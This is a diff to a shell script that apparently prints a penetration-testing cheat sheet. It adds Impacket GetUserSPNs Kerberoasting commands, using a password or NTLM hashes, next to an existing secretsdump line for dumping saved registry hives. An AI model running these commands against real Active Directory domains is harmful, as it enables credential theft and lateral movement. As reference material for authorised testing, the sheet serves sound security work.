@@ -20,3 +20,7 @@ echo -e "${Point} impacket-secretsdump -sam sam.save -security security.save -sy
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}Impacket-GetUserSPNs${End} ${Frame}###${End}"
+echo -e "${Point} impacket-GetUserSPNs -request -dc-ip \$IP domain.local/\$user:\$password -outputfile hashes.kerberoast"
+echo -e "${Point} impacket-GetUserSPNs -request -dc-ip \$IP -hashes \$LMHASH:\$NTHASH domain.local/\$user -outputfile hashes.kerberoast"
+
